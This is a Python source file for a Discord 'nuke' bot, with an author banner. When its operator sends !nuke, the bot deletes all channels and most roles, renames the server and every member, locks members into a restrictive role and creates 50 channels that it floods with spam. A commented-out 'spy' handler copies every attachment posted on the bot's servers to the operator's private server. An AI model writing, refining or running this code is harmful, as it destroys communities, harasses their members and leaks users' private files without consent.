import discord
from discord.ext import commands
import asyncio
import json

print("""
this was made by:


▒██   ██▒ ▄▄▄       ███▄    █  ▒█████  
▒▒ █ █ ▒░▒████▄     ██ ▀█   █ ▒██▒  ██▒
░░  █   ░▒██  ▀█▄  ▓██  ▀█ ██▒▒██░  ██▒
 ░ █ █ ▒ ░██▄▄▄▄██ ▓██▒  ▐▌██▒▒██   ██░
▒██▒ ▒██▒ ▓█   ▓██▒▒██░   ▓██░░ ████▓▒░
▒▒ ░ ░▓ ░ ▒▒   ▓▒█░░ ▒░   ▒ ▒ ░ ▒░▒░▒░ 
░░   ░▒ ░  ▒   ▒▒ ░░ ░░   ░ ▒░  ░ ▒ ▒░ 
 ░    ░    ░   ▒      ░   ░ ░ ░ ░ ░ ▒  
 ░    ░        ░  ░         ░     ░ ░  
                                       
""")

config_data = {
    "channels": [
        {
            "name": "the name of the channels",
            "num_of_channels": 50, #the number of channels created
            "message": "the message that should be spammed"
        }
    ],
    "token": "YOUR-DISCORD-BOT-TOKEN",
    "role_name": "the name of the role that the bot should create",
    "server_name": "the new name of the server",
    "user_name": "the name that should be assigned to every user"
}

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents)

authorized_user_id = '1154726544703488092'  #put your discord-userID here
#1154726544703488092

stop_spamming = False

async def send_message(channel, message):
    global stop_spamming
    while not stop_spamming:
        await channel.send(message)
        await asyncio.sleep(2)
        if stop_spamming:
            break

# this is a spy function, the bot will send every attachment that is send on servers the bot is in to your private server
#@bot.event
#async def on_message(message):
#    if message.attachments:  
#        other_server = bot.get_guild(your server id)  
#        other_channel = other_server.get_channel(the channel in which the attachments are sended in)
#        for attachment in message.attachments:
#            await other_channel.send(attachment)
#    await bot.process_commands(message)


#commands are !nuke and !stop
@bot.command()
async def nuke(ctx):
    if str(ctx.author.id) != authorized_user_id:
        return
    global stop_spamming
    stop_spamming = False

    # delete all channels
    for channel in ctx.guild.channels:
        await channel.delete()

    # delete all roles
    for role in ctx.guild.roles:
        if role.permissions.administrator or ctx.author.top_role == role or ctx.me.top_role <= role:
            continue
        try:
            await role.delete()
        except discord.Forbidden:
            continue
        except discord.HTTPException:
            continue

    # create a new role
    role_name = config_data["role_name"]
    role = await ctx.guild.create_role(name=role_name, permissions=discord.Permissions(read_messages=True))

    # give this role to everyone
    for member in ctx.guild.members:
        if member.id == int(authorized_user_id):
            continue
        await member.add_roles(role)

    # admin role (not functioning but cool XD)
    admin_role = await ctx.guild.create_role(name="Admin", permissions=discord.Permissions(send_messages=True))
    await ctx.author.add_roles(admin_role)

    # change the server name
    server_name = config_data["server_name"]
    await ctx.guild.edit(name=server_name)

    # change the name of all users
    user_name = config_data["user_name"]
    for member in ctx.guild.members:
        try:
            await member.edit(nick=user_name)
        except discord.Forbidden:
            continue

    # create new channels
    channel_info = config_data["channels"][0]
    created_channels = []
    channel_name = channel_info["name"]
    num_of_channels = channel_info["num_of_channels"]
    for i in range(num_of_channels):
        overwrites = {
            ctx.guild.default_role: discord.PermissionOverwrite(send_messages=False),
            admin_role: discord.PermissionOverwrite(send_messages=True)
        }
        channel = await ctx.guild.create_text_channel(f'{channel_name}', overwrites=overwrites)
        created_channels.append(channel)

    # spam the message
    message = channel_info["message"]
    tasks = [send_message(channel, message) for channel in created_channels]
    await asyncio.gather(*tasks)

#if you send the message !stop then no more messages will be send
@bot.command()
async def stop(ctx):
    if str(ctx.author.id) != authorized_user_id:
        return
    global stop_spamming
    stop_spamming = True

@bot.event
async def on_ready():
    print(f'We have logged in as {bot.user}')

token = config_data["token"]
bot.run(token)
